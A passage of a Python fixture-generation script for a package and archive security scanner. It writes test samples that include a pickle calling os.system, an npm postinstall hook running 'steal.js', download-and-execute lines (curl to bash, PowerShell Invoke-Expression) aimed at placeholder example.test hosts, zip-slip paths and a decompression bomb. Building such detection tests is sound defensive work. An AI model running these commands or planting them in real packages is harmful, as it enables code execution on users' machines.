    "eval(globalThis.atob('cGF5bG9hZA=='));\n")
write_text(os.path.join(NPM_DIR, 'js', 'clean.js'),
    "function add(a, b) {\n  return a + b;\n}\nmodule.exports = { add };\n")

# npm tarball (.tgz) — package/package.json with a postinstall hook
_tgz = os.path.join(NPM_DIR, 'tarball', 'evil_pkg-1.0.0.tgz')
_pjbytes = json.dumps({"name": "evil-tarball", "version": "1.0.0",
    "scripts": {"postinstall": "node ./steal.js"}}, indent=2).encode('utf-8')
write_tgz(_tgz, [('package/package.json', _pjbytes)])

# Lockfile with a known-vulnerable exact version (for the online OSV layer).
# lodash 4.17.4 has multiple published advisories in OSV.
write_text(os.path.join(NPM_DIR, 'locked', 'package.json'),
    json.dumps({"name": "locked-pkg", "version": "1.0.0",
                "dependencies": {"lodash": "4.17.4"}}, indent=2))
write_text(os.path.join(NPM_DIR, 'locked', 'package-lock.json'),
    json.dumps({"name": "locked-pkg", "version": "1.0.0", "lockfileVersion": 3,
                "packages": {"": {"name": "locked-pkg", "version": "1.0.0"},
                             "node_modules/lodash": {"version": "4.17.4"}}}, indent=2))

# ─────────────────────────────────────────────────────────────────────────────
# requirements.txt fixtures (OSV/PyPI dependency audit, issue #32)
# ─────────────────────────────────────────────────────────────────────────────
# Clean: exact-pinned, not (currently) vulnerable — offline/structural assertions
# only; never asserted against live OSV results, which can change over time.
write_text_checkout(os.path.join(PYREQ_DIR, 'clean', 'requirements.txt'),
    "# clean, exact-pinned deps\n"
    "certifi==2024.2.2\n")

# Unpinned: every line exercises a different "not an exact pin" shape. No
# network needed — these must all be reported as OSV-PYPI-UNPINNED and never
# reach the querybatch call.
write_text_checkout(os.path.join(PYREQ_DIR, 'unpinned', 'requirements.txt'),
    "# range specifier\n"
    "flask>=2.0\n"
    "# no specifier at all\n"
    "requests\n"
    "# compound specifier (comma-joined)\n"
    "weird==1.0,!=1.0.1\n"
    "# PEP 440 compatible-release wildcard — a range, not one exact version\n"
    "wildcard-pkg==1.2.*\n"
    "# malformed 4-equals — must fall through to unpinned, not capture '=1.0'\n"
    "badeq-pkg====1.0\n"
    "# pure option line — not a dependency, must be skipped entirely\n"
    "--index-url https://example.test/simple\n"
    "# -r/--requirement include — must be reported as an unaudited coverage gap,\n"
    "# not silently skipped (an include-only manifest must not read as \"clean\")\n"
    "-r other.txt\n"
    "# -r ATTACHED with no delimiter -- pip accepts this (verified against a real\n"
    "# pip install --dry-run); must be caught the same as the spaced form above\n"
    "-rother-attached.txt\n"
    "# editable/VCS install — no exact version, must still be reported (not silently dropped)\n"
    "-e git+https://example.test/repo.git#egg=editable-pkg\n"
    "# -e ATTACHED with no delimiter -- also real pip syntax, verified likewise\n"
    "-e./local-attached-pkg\n"
    "\n")

# Hash-pinned (pip-compile/pip-tools style): a real exact pin whose --hash
# options are appended on continuation lines. Must still be recognized as
# pinned — offline-safe assertion: the offline coverage-gap note fires only
# when at least one dependency was actually parsed as pinned.
write_text_checkout(os.path.join(PYREQ_DIR, 'hash_pinned', 'requirements.txt'),
    "certifi==2024.2.2 \\\n"
    "    --hash=sha256:0000000000000000000000000000000000000000000000000000000000000a \\\n"
    "    --hash=sha256:0000000000000000000000000000000000000000000000000000000000000b\n"
    "# space-separated option value must not be mistaken for part of the specifier\n"
    "idna==3.6 --hash sha256:000000000000000000000000000000000000000000000000000000000000000c\n"
    "# short-form -C/--config-settings with a space-separated value\n"
    "chardet==5.2.0 -C KEY=VALUE\n"
    "urllib3==2.2.1 --config-settings KEY=VALUE\n"
    "# PEP 440 '===' arbitrary equality — also an exact pin; the version must be\n"
    "# captured as '24.0', NOT as '=24.0' (which would query a bogus version)\n"
    "packaging===24.0\n")

# Vulnerable: exact-pinned to a version with well-known published advisories
# (CVE-2023-44271 and others exist for Pillow < 10.0.1) — for the Online layer.
write_text_checkout(os.path.join(PYREQ_DIR, 'vulnerable', 'requirements.txt'),
    "Pillow==9.5.0\n")

# ─────────────────────────────────────────────────────────────────────────────
# .nupkg fixtures (OSV/NuGet dependency audit, issue #32)
# ─────────────────────────────────────────────────────────────────────────────
# Clean: a package id/version that does not exist on OSV — offline/structural
# assertions only, same rationale as the PyPI 'clean' fixture above.
write(os.path.join(NUGET_DIR, 'clean', 'Contoso.Fixture.Clean.1.0.0.nupkg'),
      make_nupkg('Contoso.Fixture.Clean', '1.0.0'))

# Vulnerable: Newtonsoft.Json 12.0.1 has a published advisory (GHSA-5crp-9r3c-p9vr,
# DoS via unbounded nesting depth, fixed in 13.0.1) — for the Online layer.
write(os.path.join(NUGET_DIR, 'vulnerable', 'Newtonsoft.Json.12.0.1.nupkg'),
      make_nupkg('Newtonsoft.Json', '12.0.1'))

# Same-basename collision: two .nupkg files sharing a FILENAME in different
# directories. The first carries a .nuspec, the second carries none. If both
# extract into one staging dir, the second inherits the first's manifest and is
# audited under the WRONG identity instead of reporting its coverage gap.
# On untrusted input that collision is attacker-arrangeable.
write(os.path.join(NUGET_DIR, 'collide', 'a', 'Same.1.0.0.nupkg'),
      make_nupkg('Contoso.Fixture.Collide', '1.0.0'))
write(os.path.join(NUGET_DIR, 'collide', 'b', 'Same.1.0.0.nupkg'),
      make_nupkg_without_nuspec())

# Ambiguous identity: two root .nuspec files. Alphabetically first is a benign
# decoy; the second is the real, vulnerable identity a real NuGet client would
# refuse to guess between. The scanner must report the ambiguity, not pick 'A...'.
write(os.path.join(NUGET_DIR, 'ambiguous', 'Confused.1.0.0.nupkg'),
      make_nupkg_ambiguous('AAA.Decoy.Package', '1.0.0', 'Newtonsoft.Json', '12.0.1'))

# Nested-decoy identity spoof: ONE root .nuspec (unlike 'ambiguous' above), but
# a decoy <metadata> nested inside a wrapper element ahead of the real
# <package><metadata>. Must resolve to the real (vulnerable) identity, not the
# decoy — see the 'Get-NuGetDep' root-scoped lookup fix.
write(os.path.join(NUGET_DIR, 'nested_decoy', 'Spoofed.1.0.0.nupkg'),
      make_nupkg_nested_decoy('Totally.Benign.Package', '1.0.0', 'Newtonsoft.Json', '12.0.1'))

# Multiple root-level <metadata> elements (structurally invalid nuspec, but
# nothing stops a crafted package from shipping it) — must be rejected as
# ambiguous rather than silently picking the first one.
write(os.path.join(NUGET_DIR, 'multi_metadata', 'MultiMeta.1.0.0.nupkg'),
      make_nupkg_raw_nuspec(
          '<?xml version="1.0" encoding="utf-8"?>\n'
          '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">\n'
          '  <metadata><id>First.Identity</id><version>1.0.0</version></metadata>\n'
          '  <metadata><id>Second.Identity</id><version>2.0.0</version></metadata>\n'
          '</package>\n',
          'MultiMeta.nuspec'))

# Duplicate <id> within a single, otherwise-valid <metadata> block — must be
# rejected as ambiguous rather than picking the first <id>.
write(os.path.join(NUGET_DIR, 'duplicate_id', 'DupeId.1.0.0.nupkg'),
      make_nupkg_raw_nuspec(
          '<?xml version="1.0" encoding="utf-8"?>\n'
          '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">\n'
          '  <metadata>\n'
          '    <id>First.Id</id>\n'
          '    <id>Second.Id</id>\n'
          '    <version>1.0.0</version>\n'
          '  </metadata>\n'
          '</package>\n',
          'DupeId.nuspec'))

# Missing <version> element entirely — must be rejected (not misread as an
# empty-but-present version) rather than silently proceeding with no version.
write(os.path.join(NUGET_DIR, 'missing_version', 'NoVersion.1.0.0.nupkg'),
      make_nupkg_raw_nuspec(
          '<?xml version="1.0" encoding="utf-8"?>\n'
          '<package xmlns="http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd">\n'
          '  <metadata>\n'
          '    <id>No.Version.Package</id>\n'
          '  </metadata>\n'
          '</package>\n',
          'NoVersion.nuspec'))

# ─────────────────────────────────────────────────────────────────────────────
# Model / pickle fixtures (v0.7)
# ─────────────────────────────────────────────────────────────────────────────
import pickle as _pickle
import struct as _struct

# Benign pickle — plain data, no GLOBAL/REDUCE
write(os.path.join(MODEL_DIR, 'safe.pkl'),
      _pickle.dumps({"weights": [1, 2, 3], "name": "clean-model"}))

# Malicious pickle — __reduce__ returns os.system(...) => GLOBAL + REDUCE.
# Only DUMPED here (never loaded); the class need not be importable later.
class _Exploit:
    def __reduce__(self):
        import os
        return (os.system, ("echo pwned",))
write(os.path.join(MODEL_DIR, 'malicious.pkl'), _pickle.dumps(_Exploit()))

# safetensors — safe-by-design (8-byte LE header length + JSON header)
_st_header = b'{"__metadata__":{"format":"pt"}}'
write(os.path.join(MODEL_DIR, 'model.safetensors'),
      _struct.pack('<Q', len(_st_header)) + _st_header)

# PyTorch-style .pt — a ZIP containing <name>/data.pkl (malicious pickle)
_pt = os.path.join(MODEL_DIR, 'model.pt')
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr(zipfile.ZipInfo('model/data.pkl', FIXED_ZIP_DT), _pickle.dumps(_Exploit()))
write(_pt, buf.getvalue())

# ─────────────────────────────────────────────────────────────────────────────
# Generic-archive hazard fixtures (v0.8)
# ─────────────────────────────────────────────────────────────────────────────
# Clean zip — normal files, no hazards
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('a.txt', FIXED_ZIP_DT), 'hello\n')
    z.writestr(zipfile.ZipInfo('dir/b.txt', FIXED_ZIP_DT), 'world\n')
write(os.path.join(ARCHIVE_DIR, 'clean.zip'), buf.getvalue())

# Decompression bomb — one entry of 16 MiB zeros. NOTE: a ZipInfo defaults to
# ZIP_STORED, so compress_type must be passed explicitly or it won't compress.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr(zipfile.ZipInfo('bomb.bin', FIXED_ZIP_DT),
               b'\x00' * (16 * 1024 * 1024), zipfile.ZIP_DEFLATED)
write(os.path.join(ARCHIVE_DIR, 'bomb.zip'), buf.getvalue())

# Symlink entry (unix S_IFLNK mode in external attributes)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
    zi = zipfile.ZipInfo('evil-link', FIXED_ZIP_DT)
    zi.external_attr = (0o120777 << 16)        # S_IFLNK | 0777
    z.writestr(zi, '/etc/passwd')
    z.writestr(zipfile.ZipInfo('readme.txt', FIXED_ZIP_DT), 'ok\n')
write(os.path.join(ARCHIVE_DIR, 'symlink.zip'), buf.getvalue())

# Nested archive — a zip containing another zip
_inner = io.BytesIO()
with zipfile.ZipFile(_inner, 'w') as iz:
    iz.writestr(zipfile.ZipInfo('inner.txt', FIXED_ZIP_DT), 'nested\n')
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('payload.zip', FIXED_ZIP_DT), _inner.getvalue())
    z.writestr(zipfile.ZipInfo('notes.txt', FIXED_ZIP_DT), 'see payload.zip\n')
write(os.path.join(ARCHIVE_DIR, 'nested.zip'), buf.getvalue())

# Path traversal (zip-slip)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as z:
    z.writestr('safe.txt', 'ok\n')
    z.writestr('../../escape.txt', 'pwned\n')
write(os.path.join(ARCHIVE_DIR, 'traversal.zip'), buf.getvalue())

# ─────────────────────────────────────────────────────────────────────────────
# Recursive archive-member dispatch fixtures (issue #31).
# ─────────────────────────────────────────────────────────────────────────────
# A. Disguised script + real scripts inside a plain zip. payload.txt has NO
#    shebang and an innocent extension — only content-first classification
#    (New-Unit, reused as-is for archive members) catches it.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('notes/payload.txt', FIXED_ZIP_DT),
        "[CmdletBinding()]\nparam($Url)\n"
        "$wc = New-Object System.Net.WebClient\n"
        "Invoke-Expression ($wc.DownloadString('http://example.test/p'))\n"
        "Write-Host 'done'\n")
    z.writestr(zipfile.ZipInfo('scripts/tool.sh', FIXED_ZIP_DT),
        '#!/bin/bash\ncurl https://example.test/install.sh | bash\n')
write(os.path.join(ARCMEM_DIR, 'disguised_and_scripts.zip'), buf.getvalue())

# B. .js with no package.json anywhere in the archive — must still be scanned
#    (NpmScan's loose-unit path does not require a manifest).
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('app.js', FIXED_ZIP_DT),
        "const cp = require('child_process');\n"
        "cp.exec('whoami');\n"
        "eval(globalThis.atob('cGF5bG9hZA=='));\n")
write(os.path.join(ARCMEM_DIR, 'js_no_pkg.zip'), buf.getvalue())

# C. Two levels of real nesting: outer.zip -> inner.zip -> deep/risky.sh.
#    Proves recursion actually opens and scans a nested archive's CONTENT
#    (not just flags that nesting exists — the existing archive/nested.zip
#    fixture's inner archive holds only inert text).
_inner_risky = io.BytesIO()
with zipfile.ZipFile(_inner_risky, 'w', zipfile.ZIP_DEFLATED) as iz:
    iz.writestr(zipfile.ZipInfo('deep/risky.sh', FIXED_ZIP_DT),
        '#!/bin/bash\necho "cGF5bG9hZAo=" | base64 -d | bash\n')
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('inner.zip', FIXED_ZIP_DT), _inner_risky.getvalue())
write(os.path.join(ARCMEM_DIR, 'two_level_nested.zip'), buf.getvalue())

# D. A nested decompression bomb — proves zip-slip/bomb/symlink hardening runs
#    before EVERY extraction, including a nested one, not just the top level.
_inner_bomb = io.BytesIO()
with zipfile.ZipFile(_inner_bomb, 'w') as iz:
    iz.writestr(zipfile.ZipInfo('bomb.bin', FIXED_ZIP_DT),
                b'\x00' * (16 * 1024 * 1024), zipfile.ZIP_DEFLATED)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('inner_bomb.zip', FIXED_ZIP_DT), _inner_bomb.getvalue())
write(os.path.join(ARCMEM_DIR, 'nested_bomb.zip'), buf.getvalue())

# E. npm lifecycle hook + a malicious pickle in ONE archive — proves member
#    dispatch produces exactly one finding per (member, rule), not duplicated
#    by a parent-level whole-tree walk (the old NpmScan/PickleOpcodeScan
#    'archive' branches this PR removes).
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('pkg/package.json', FIXED_ZIP_DT),
        json.dumps(_malicious_pkg, indent=2))
    z.writestr(zipfile.ZipInfo('models/bad.pkl', FIXED_ZIP_DT), _pickle.dumps(_Exploit()))
write(os.path.join(ARCMEM_DIR, 'no_dupes.zip'), buf.getvalue())

# F. A single, clean shell-script member — dedicated fixture for the
#    disabled-analyzer aggregate-coverage test (isolated from any other
#    member so the aggregate finding's count is unambiguous).
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('run.sh', FIXED_ZIP_DT), '#!/bin/bash\necho hello\n')
write(os.path.join(ARCMEM_DIR, 'shell_only.zip'), buf.getvalue())

# G. A real wheel (semantic container) embedded inside a generic zip (review
#    follow-up on #37, P4 review). Proves the wheel's EXPANDED content size
#    (once extracted), not just its compressed size as it sat inside the
#    parent zip, gets charged to the shared archive-tree budget.
with open(os.path.join(PYTHON_DIR, 'clean_pkg-1.0-py3-none-any.whl'), 'rb') as _f:
    _clean_wheel_bytes = _f.read()
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('bundled.whl', FIXED_ZIP_DT), _clean_wheel_bytes)
write(os.path.join(ARCMEM_DIR, 'nested_wheel.zip'), buf.getvalue())

# H. A malicious pickle stored under a .bin extension, not .pkl (review
#    follow-up on #37, P4 review). PickleOpcodeScan's old whole-archive walk
#    covered .bin/.h5/.hdf5/.pb/.onnx/.npy/.npz; recursive member dispatch
#    only routes what Classify.ps1 recognizes as 'model' -- these extensions
#    needed to be added there too, or this is silently missed.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('model.bin', FIXED_ZIP_DT), _pickle.dumps(_Exploit()))
write(os.path.join(ARCMEM_DIR, 'malicious_bin.zip'), buf.getvalue())

# I. A multi-member gzip tarball with deterministic, known per-entry sizes
#    (review follow-up on #37, third review round). Proves tar extraction is
#    now STREAMED with per-entry budget enforcement -- unlike the previous
#    bulk `tar -xzf`/tarfile.extractall(), which wrote every entry before
#    returning control, a tight budget must leave LATER entries unextracted
#    while EARLIER ones (within budget) are still written.
_multi_tar = os.path.join(ARCMEM_DIR, 'multi_member.tgz')
_multi_members = []
for _i, _size in enumerate([1000, 2000, 3000], start=1):
    _data = (str(_i).encode() * _size)[:_size]
    _multi_members.append((f'file{_i}.bin', _data))
write_tgz(_multi_tar, _multi_members)

# ─────────────────────────────────────────────────────────────────────────────
# Metadata-only archive fallback fixtures (issue #39 / v0.14).
# ─────────────────────────────────────────────────────────────────────────────
_vulnerable_wheel = make_wheel(
    'Pillow', '9.5.0', {'PIL/__init__.py': b'__version__ = "9.5.0"\n'},
    requires=['urllib3 (==1.26.5)', 'requests (>=2)'])
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('packages/Pillow-9.5.0-py3-none-any.whl', FIXED_ZIP_DT),
               _vulnerable_wheel)
    z.writestr(zipfile.ZipInfo('payload/large.bin', FIXED_ZIP_DT),
               seeded_bytes('archive-metadata-payload', 4096))
write(os.path.join(ARCMETA_DIR, 'nested_vulnerable_wheel.zip'), buf.getvalue())

# Canonical zipped-egg identity, exercised directly and inside a blocked ZIP.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('EGG-INFO/PKG-INFO', FIXED_ZIP_DT),
               'Metadata-Version: 1.2\nName: Pillow\nVersion: 9.5.0\n')
    z.writestr(zipfile.ZipInfo('PIL/__init__.py', FIXED_ZIP_DT),
               '__version__ = "9.5.0"\n')
_metadata_egg = buf.getvalue()
write(os.path.join(ARCMETA_DIR, 'Pillow-9.5.0-py3.egg'), _metadata_egg)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('packages/Pillow-9.5.0-py3.egg', FIXED_ZIP_DT),
               _metadata_egg)
write(os.path.join(ARCMETA_DIR, 'nested_egg.zip'), buf.getvalue())

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('pyproject.toml', FIXED_ZIP_DT),
               '[project]\ndependencies = [\n'
               '  "requests[security]==2.31.0", # ] "decoy==1"\n'
               '  \'urllib3[socks]==1.26.5; python_version >= "3.8"\',\n'
               '  "Pillow==9.5.0",\n]\n')
write(os.path.join(ARCMETA_DIR, 'pyproject_extras.zip'), buf.getvalue())

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('pyproject.toml', FIXED_ZIP_DT),
               '[project.optional-dependencies]\n'
               'security = ["requests[security]==2.31.0"]\n'
               '\'docs\' = ["urllib3==1.26.5", "Sphinx>=7"]\n')
    for lock_name in ('poetry.lock', 'uv.lock'):
        z.writestr(zipfile.ZipInfo(lock_name, FIXED_ZIP_DT),
                   '[[package]]\nname = "Pillow"\nversion = "9.5.0"\n'
                   '[[package]]\nname = "missing-version"\n'
                   '[[package]]\nversion = "1.0"\n')
write(os.path.join(ARCMETA_DIR, 'optional_and_mixed_locks.zip'), buf.getvalue())

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
    for suffix in ('a', 'b'):
        z.writestr(zipfile.ZipInfo(f'requirements-{suffix}.txt', FIXED_ZIP_DT),
                   'unpinned\n' * 10000)
write(os.path.join(ARCMETA_DIR, 'dense_requirements.zip'), buf.getvalue())

_stopped_tar = make_tgz_bytes([
    ('requirements-a.txt', b'Pillow==9.5.0\n'),
    ('requirements-b.txt', b'urllib3==1.26.5\n#' + b'padding' * 40 + b'\n'),
])
write(os.path.join(ARCMETA_DIR, 'stopped_metadata.tgz'), _stopped_tar)
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_STORED) as z:
    z.writestr(zipfile.ZipInfo('dependencies.tgz', FIXED_ZIP_DT), _stopped_tar)
write(os.path.join(ARCMETA_DIR, 'nested_stopped_tar.zip'), buf.getvalue())
write(os.path.join(ARCMETA_DIR, 'stopped_nested_wheel.tgz'), make_tgz_bytes([
    ('Pillow-9.5.0.whl', _vulnerable_wheel),
    ('requirements.txt', b'requests==2.31.0\n'),
]))
write(os.path.join(ARCMETA_DIR, 'rejected_metadata.tgz'), make_tgz_bytes([
    ('requirements.txt', b'Pillow==9.5.0\n'),
    ('../outside.txt', b'not safe to extract\n'),
]))

# The outer ZIP is small enough to pass a tight archive-tree look-ahead, while
# the wheel's own central directory declares a much larger expanded payload.
# This drives Engine.ps1's NESTED semantic-container budget-blocked branch.
_large_wheel_buf = io.BytesIO()
with zipfile.ZipFile(_large_wheel_buf, 'w', zipfile.ZIP_DEFLATED) as _wheel_zip:
    _large_entry = zipfile.ZipInfo('PIL/large.dat', FIXED_ZIP_DT)
    _large_entry.compress_type = zipfile.ZIP_DEFLATED
    _wheel_zip.writestr(_large_entry, b'0' * (2 * 1024 * 1024))
    _large_metadata = zipfile.ZipInfo('Pillow-9.5.0.dist-info/METADATA', FIXED_ZIP_DT)
    _large_metadata.compress_type = zipfile.ZIP_DEFLATED
    _wheel_zip.writestr(_large_metadata,
                        'Metadata-Version: 2.1\nName: Pillow\nVersion: 9.5.0\n')
_large_inner_wheel = _large_wheel_buf.getvalue()
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('packages/Pillow-large.whl', FIXED_ZIP_DT),
               _large_inner_wheel)
write(os.path.join(ARCMETA_DIR, 'nested_budget_blocked_wheel.zip'), buf.getvalue())

_meta = (b'Metadata-Version: 2.1\nName: Pillow\nVersion: 9.5.0\n'
         b'Requires-Dist: urllib3 (==1.26.5)\n')
write_tgz(os.path.join(ARCMETA_DIR, 'metadata.tgz'),
          [('Pillow-9.5.0.dist-info/METADATA', _meta),
           ('payload.bin', seeded_bytes('archive-metadata-tgz-payload', 2048))])
write_tar(os.path.join(ARCMETA_DIR, 'metadata.tar'),
          [('Pillow-9.5.0.dist-info/METADATA', _meta)])

# A nested gzip TAR exercises kind propagation independently of the synthetic
# spool filename. Test both ZIP and TAR parents because each has its own spool
# branch in DependencyMetadata.ps1.
_inner_metadata_tgz = make_tgz_bytes(
    [('Pillow-9.5.0.dist-info/METADATA', _meta)])
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('nested/dependencies.tar.gz', FIXED_ZIP_DT),
               _inner_metadata_tgz)
write(os.path.join(ARCMETA_DIR, 'nested_targz.zip'), buf.getvalue())
write_tar(os.path.join(ARCMETA_DIR, 'nested_targz.tar'),
          [('nested/dependencies.tar.gz', _inner_metadata_tgz)])

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('requirements-prod.txt', FIXED_ZIP_DT),
               'Pillow==9.5.0\nrequests>=2\n')
    z.writestr(zipfile.ZipInfo('package-lock.json', FIXED_ZIP_DT),
               json.dumps({'lockfileVersion': 3,
                           'packages': {'': {}, 'node_modules/lodash': {'version': '4.17.4'}}}))
    z.writestr(zipfile.ZipInfo('Pipfile.lock', FIXED_ZIP_DT),
               json.dumps({'default': {'urllib3': {'version': '==1.26.5'}}}))
    z.writestr(zipfile.ZipInfo('poetry.lock', FIXED_ZIP_DT),
               '[[package]]\nname = "Pillow"\nversion = "9.5.0"\n')
    z.writestr(zipfile.ZipInfo('uv.lock', FIXED_ZIP_DT),
               '[[package]]\nname = "urllib3"\nversion = "1.26.5"\n')
    z.writestr(zipfile.ZipInfo('pyproject.toml', FIXED_ZIP_DT),
               '[project]\ndependencies = ["Pillow==9.5.0", "requests>=2"]\n')
    z.writestr(zipfile.ZipInfo('Example.nuspec', FIXED_ZIP_DT),
               '<?xml version="1.0"?><package><metadata><id>Newtonsoft.Json</id>'
               '<version>12.0.1</version><dependencies>'
               '<dependency id="Example.Exact" version="[1.2.3]" />'
               '<dependency id="Example.Range" version="[1.0,2.0)" />'
               '</dependencies></metadata></package>')
write(os.path.join(ARCMETA_DIR, 'supported_manifests.zip'), buf.getvalue())

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('../requirements.txt', FIXED_ZIP_DT), 'Pillow==9.5.0\n')
write(os.path.join(ARCMETA_DIR, 'traversal_metadata.zip'), buf.getvalue())

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    link = zipfile.ZipInfo('Pillow-9.5.0.dist-info/METADATA', FIXED_ZIP_DT)
    link.create_system = 3
    link.external_attr = (0o120777 << 16)
    z.writestr(link, '../real-metadata')
write(os.path.join(ARCMETA_DIR, 'symlink_metadata.zip'), buf.getvalue())

# Python's zipfile cannot write encrypted archives, so mark the general-purpose
# encryption flag in both the local and central headers of a deterministic ZIP.
# The metadata reader must reject it before attempting to open the entry.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('requirements.txt', FIXED_ZIP_DT), 'Pillow==9.5.0\n')
_encrypted = bytearray(buf.getvalue())
for _signature, _flag_offset in ((b'PK\x03\x04', 6), (b'PK\x01\x02', 8)):
    _at = 0
    while True:
        _at = _encrypted.find(_signature, _at)
        if _at < 0:
            break
        _flags = struct.unpack_from('<H', _encrypted, _at + _flag_offset)[0] | 0x0001
        struct.pack_into('<H', _encrypted, _at + _flag_offset, _flags)
        _at += 4
write(os.path.join(ARCMETA_DIR, 'encrypted_metadata.zip'), bytes(_encrypted))

_special_tar = os.path.join(ARCMETA_DIR, 'special_metadata.tar')
with _tarfile.open(_special_tar, mode='w', format=_tarfile.PAX_FORMAT) as tf:
    link = _tarfile.TarInfo('Pillow-9.5.0.dist-info/METADATA')
    link.type = _tarfile.SYMTYPE
    link.linkname = '../real-metadata'
    link.mtime = FIXED_EPOCH
    tf.addfile(link)
print(f'  wrote {_special_tar}')

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('requirements.txt', FIXED_ZIP_DT), 'Pillow==9.5.0\n')
    z.writestr(zipfile.ZipInfo('requirements.txt', FIXED_ZIP_DT), 'urllib3==1.26.5\n')
write(os.path.join(ARCMETA_DIR, 'duplicate_metadata.zip'), buf.getvalue())

buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    oversized_metadata = zipfile.ZipInfo('requirements-big.txt', FIXED_ZIP_DT)
    oversized_metadata.compress_type = zipfile.ZIP_DEFLATED
    z.writestr(oversized_metadata, ('Pillow==9.5.0\n' + '# padding\n' * 140000))
write(os.path.join(ARCMETA_DIR, 'oversized_metadata.zip'), buf.getvalue())

# The first candidate cannot fit the remaining decoded-byte budget, but the
# later exact pin can. Per-entry byte misses must not abort the container.
_large_candidate = ('# padding\n' * 20).encode('utf-8')
_small_candidate = b'urllib3==1.26.5\n'
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('requirements-a.txt', FIXED_ZIP_DT), _large_candidate)
    z.writestr(zipfile.ZipInfo('requirements-z.txt', FIXED_ZIP_DT), _small_candidate)
write(os.path.join(ARCMETA_DIR, 'decoded_skip.zip'), buf.getvalue())
write_tar(os.path.join(ARCMETA_DIR, 'decoded_skip.tar'),
          [('requirements-a.txt', _large_candidate),
           ('requirements-z.txt', _small_candidate)])

# ZIP magic under a .nuspec suffix must remain on the generic archive path so
# payload members still receive ordinary classifier/analyzer coverage.
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as z:
    z.writestr(zipfile.ZipInfo('payload/risky.sh', FIXED_ZIP_DT),
               '#!/bin/bash\ncurl https://example.test/payload | bash\n')
write(os.path.join(ARCMETA_DIR, 'renamed_archive.nuspec'), buf.getvalue())

# Gzip magic alone does not imply a TAR payload. It must not consume an archive
# staging slot or leave an empty directory behind.
_bare_gzip = io.BytesIO()
with gzip.GzipFile(filename='', mode='wb', fileobj=_bare_gzip,
                   compresslevel=9, mtime=FIXED_EPOCH) as gz:
    gz.write(b'plain gzip payload\n')
write(os.path.join(ARCMETA_DIR, 'bare_payload.gz'), _bare_gzip.getvalue())

write(os.path.join(ARCMETA_DIR, 'corrupt.zip'), b'PK\x03\x04truncated')

# ─────────────────────────────────────────────────────────────────────────────
# VB-family fixtures (issue #25) — exported VBA modules and VBScript.
# Static text only: nothing here is ever executed, and the "payloads" reference
# TEST-NET-2 (198.51.100.0/24, RFC 5737) and .test names, which are unroutable.
# ─────────────────────────────────────────────────────────────────────────────
write_text(os.path.join(VBA_DIR, 'clean.bas'),
    'Attribute VB_Name = "Formatting"\n'
    'Option Explicit\n'
    '\n'
    'Sub FormatReport()\n'
    '    Dim ws As Worksheet\n'
